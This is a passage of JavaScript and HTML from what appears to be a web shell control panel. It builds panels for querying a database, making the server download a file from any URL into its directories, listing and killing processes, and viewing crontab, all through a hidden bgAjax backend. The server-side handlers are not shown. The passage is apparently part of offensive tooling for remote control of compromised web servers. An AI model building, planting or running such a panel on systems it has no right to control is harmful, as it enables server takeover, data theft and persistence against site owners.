                                var val = row[h] !== null ? String(row[h]) : '<span style="color:#3a4a5a;">NULL</span>';
                                table += '<td title="' + esc(val) + '">' + esc(val.substring(0, 200)) + '</td>';
                            });
                            table += '</tr>';
                        });
                        table += '</tbody></table>';
                        document.getElementById('bgDBOutput').innerHTML = table;
                    } else {
                        document.getElementById('bgDBOutput').innerHTML = '<span class="info">Query returned ' + data.length + ' rows (or no results).</span>';
                    }
                } catch (e) {
                    document.getElementById('bgDBOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
                }
            });
        }

        // ==================== DOWNLOAD FILE ====================
        function openDownload() {
            var html = '<div class="bg-form-row">' +
                '<label><span>URL</span><input type="text" id="bgDownloadUrl" placeholder="http://example.com/file.txt"></label>' +
                '<label><span>Destination (optional)</span><input type="text" id="bgDownloadDest" value="' + esc(curDir) + '/" placeholder="Leave empty for auto"></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runDownload()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">⬇️ Download</button>' +
                '</div>' +
                '<div id="bgDownloadOutput" class="bg-output"></div>';
            openModal('⬇️ File Downloader', html, '<button onclick="closeModal()">Close</button>');
        }

        function runDownload() {
            var url = document.getElementById('bgDownloadUrl').value;
            var dest = document.getElementById('bgDownloadDest').value;
            if (!url) { alert('Enter URL'); return; }
            document.getElementById('bgDownloadOutput').innerHTML = '<span class="info">Downloading...</span>';
            bgAjax('ajax=1&bg_action=download&url=' + encodeURIComponent(url) + '&dest=' + encodeURIComponent(dest), function (r) {
                document.getElementById('bgDownloadOutput').innerHTML = '<span class="success">' + esc(r) + '</span>';
                setTimeout(function () { refreshFB(curDir); }, 500);
            });
        }

        // ==================== HASH & ENCODE ====================
        function openHash() {
            var html = '<div class="bg-form-row">' +
                '<label><span>Text / String</span><textarea id="bgHashText" rows="3" style="background:#050810;border:1px solid #1a2a3a;border-radius:3px;padding:6px;color:var(--white);font-family:inherit;font-size:11px;"></textarea></label>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<button class="primary" onclick="runHash()" style="padding:7px 18px;background:linear-gradient(135deg,#003300,#005500);border:1px solid #00ff41;border-radius:3px;color:#b0ffb0;cursor:pointer;font-family:inherit;font-size:11px;">#️⃣ Generate</button>' +
                '</div>' +
                '<div id="bgHashOutput" class="bg-output"></div>';
            openModal('#️⃣ Hash & Encode', html, '<button onclick="closeModal()">Close</button>');
        }

        function runHash() {
            var text = document.getElementById('bgHashText').value;
            if (!text) { alert('Enter some text'); return; }
            document.getElementById('bgHashOutput').innerHTML = '<span class="info">Processing...</span>';
            bgAjax('ajax=1&bg_action=hash_encode&text=' + encodeURIComponent(text), function (r) {
                document.getElementById('bgHashOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // ==================== PROCESS MANAGER ====================
        function openProcessMgr() {
            var html = '<div class="bg-form-row">' +
                '<button class="primary" onclick="runProcessList()" style="padding:7px 18px;background:linear-gradient(135deg,#004488,#0066bb);border:1px solid #00aaff;border-radius:3px;color:white;cursor:pointer;font-family:inherit;font-size:11px;">🔄 Refresh Process List</button>' +
                '</div>' +
                '<div class="bg-form-row">' +
                '<label><span>Kill PID</span><input type="text" id="bgKillPID" placeholder="1234" style="width:100px;"></label>' +
                '<button class="danger" onclick="runKillProcess()" style="padding:7px 18px;background:transparent;border:1px solid #3a2a2a;border-radius:3px;color:#ff4466;cursor:pointer;font-family:inherit;font-size:11px;">⛔ Kill Process</button>' +
                '</div>' +
                '<div id="bgProcOutput" class="bg-output" style="max-height:500px;"></div>';
            openModal('⚙️ Process Manager', html, '<button onclick="closeModal()">Close</button>');
            setTimeout(runProcessList, 100);
        }

        function runProcessList() {
            document.getElementById('bgProcOutput').innerHTML = '<span class="info">Loading processes...</span>';
            bgAjax('ajax=1&bg_action=process_list', function (r) {
                document.getElementById('bgProcOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        function runKillProcess() {
            var pid = document.getElementById('bgKillPID').value;
            if (!pid) { alert('Enter a PID'); return; }
            bgAjax('ajax=1&bg_action=process_kill&pid=' + encodeURIComponent(pid), function (r) {
                document.getElementById('bgProcOutput').innerHTML = '<pre class="error">' + esc(r) + '</pre>';
                setTimeout(runProcessList, 500);
            });
        }

        // ==================== CRONTAB MANAGER ====================
        function openCrontab() {
            var html = '<div class="bg-form-row">' +
                '<button class="primary" onclick="runCrontabList()" style="padding:7px 18px;background:linear-gradient(135deg,#004488,#0066bb);border:1px solid #00aaff;border-radius:3px;color:white;cursor:pointer;font-family:inherit;font-size:11px;">🔄 Refresh Crontab</button>' +
                '</div>' +
                '<div id="bgCronOutput" class="bg-output"></div>';
            openModal('⏰ Crontab Manager', html, '<button onclick="closeModal()">Close</button>');
            setTimeout(runCrontabList, 100);
        }

        function runCrontabList() {
            document.getElementById('bgCronOutput').innerHTML = '<span class="info">Loading crontab...</span>';
            bgAjax('ajax=1&bg_action=crontab_list', function (r) {
                document.getElementById('bgCronOutput').innerHTML = '<pre>' + esc(r) + '</pre>';
            });
        }

        // Override the esc function for the sidebar file browser
        function esc(s) {
            var d = document.createElement('div');
            d.textContent = s;
            return d.innerHTML;
        }
    </script>
</body>

</html>